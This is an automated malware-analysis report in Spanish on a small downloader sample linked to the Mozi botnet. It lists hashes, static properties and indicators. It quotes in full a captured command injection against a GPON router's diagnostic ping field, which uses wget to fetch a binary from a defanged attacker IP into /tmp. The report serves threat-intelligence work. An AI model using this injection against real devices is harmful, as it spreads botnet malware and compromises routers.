# 🧬 Payload Analysis

`be595a66b852abe3d4f4d5651ef986ee7b33fb21cb1f05b7de4664f10d541bdb`

## 📌 Resumen

Texto ASCII de 139 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://103.199.123.XXX:57394/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://103.199.123.XXX:57394/Mozi.m -O ->/tmp/gpon80` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/be595a66b852abe3d4f4d5651ef986ee7b33fb21cb1f05b7de4664f10d541bdb.md](../../../../../malware-like/oraculo/downloader/be595a66b852abe3d4f4d5651ef986ee7b33fb21cb1f05b7de4664f10d541bdb.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:40:04.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `be595a66b852abe3d4f4d5651ef986ee7b33fb21cb1f05b7de4664f10d541bdb`
- **MD5:** `e2c2f44b2a22b90cc2de83c37ade29f6`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 139 B |
| Entropía | 5.14 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://103.199.123.XXX:57394/Mozi.m+-O+->/tmp/gpon80;s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://103.199.123.XXX:57394/Mozi.m+-O+- | strings |
| ip | 103.199.123.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://103.199.123.XXX:57394/Mozi.m+-O+->/tmp/gpon80;s | strings |
| hash | be595a66b852abe3d4f4d5651ef986ee7b33fb21cb1f05b7de4664f10d541bdb | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
